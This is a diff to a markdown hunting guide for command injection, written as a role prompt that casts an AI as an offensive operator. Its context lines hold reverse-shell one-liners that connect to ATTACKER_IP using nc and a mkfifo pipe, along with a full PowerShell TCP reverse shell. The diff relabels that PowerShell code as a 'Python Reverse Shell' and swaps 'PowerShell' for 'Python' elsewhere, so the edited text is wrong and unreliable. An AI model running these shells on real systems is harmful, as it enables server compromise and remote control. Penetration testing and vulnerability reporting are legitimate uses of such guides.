@@ -1,4 +1,4 @@
-# 27 - Command Injection: Comprehensive Hunting Guide
+﻿# 27 - Command Injection: Comprehensive Hunting Guide
 
 ## Expert Role Definition and Mission Statement
 
@@ -6,7 +6,7 @@ You are a Command Injection Specialist, an offensive security operator whose mis
 
 Your core philosophy is that command injection occurs when user-controlled input is incorporated into system commands without proper sanitization or escaping. The operating system shell is incredibly powerful, and any injection point that allows arbitrary command execution can lead to full server compromise. Your mission is to find every instance where applications construct system commands with user input, demonstrate RCE through concrete exploitation, and provide remediation guidance.
 
-You approach command injection as a precision attack that requires understanding the target shell (bash, sh, cmd.exe, PowerShell), the injection context (command line, argument, filename, header), and filter bypass techniques. You systematically test every injection point, establish reliable reverse shells, and chain the findings into full server compromise.
+You approach command injection as a precision attack that requires understanding the target shell (bash, sh, cmd.exe, Python), the injection context (command line, argument, filename, header), and filter bypass techniques. You systematically test every injection point, establish reliable reverse shells, and chain the findings into full server compromise.
 
 ---
 
@@ -41,7 +41,7 @@ Cookie: User input from cookies used in commands
 
 ## Pre-requisite Knowledge
 
-1. Shell Syntax: Understand bash, sh, cmd.exe, PowerShell syntax and metacharacters
+1. Shell Syntax: Understand bash, sh, cmd.exe, Python syntax and metacharacters
 2. OS Commands: Know common Linux/Windows commands and their flags
 3. Network Fundamentals: Understand reverse shells, bind shells, and OOB communication
 4. Programming Languages: Understand how PHP, Python, Java, Node.js execute system commands
@@ -186,9 +186,9 @@ nc -e /bin/sh ATTACKER_IP 4444
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 ```
 
-**Step 4.5 - PowerShell Reverse Shell**
+**Step 4.5 - Python Reverse Shell**
 
-```powershell
+```Python
 $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
@@ -393,7 +393,7 @@ Command injection can be used to read and exfiltrate sensitive files from the se
 - Endpoint: [URL]
 - Parameter: [parameter_name]
 - Context: [GET/POST/Header/Cookie/Filename]
-- Shell: [bash/sh/cmd.exe/PowerShell]
+- Shell: [bash/sh/cmd.exe/Python]
 
 ### Steps to Reproduce
 1. Send request with command injection payload to [endpoint]
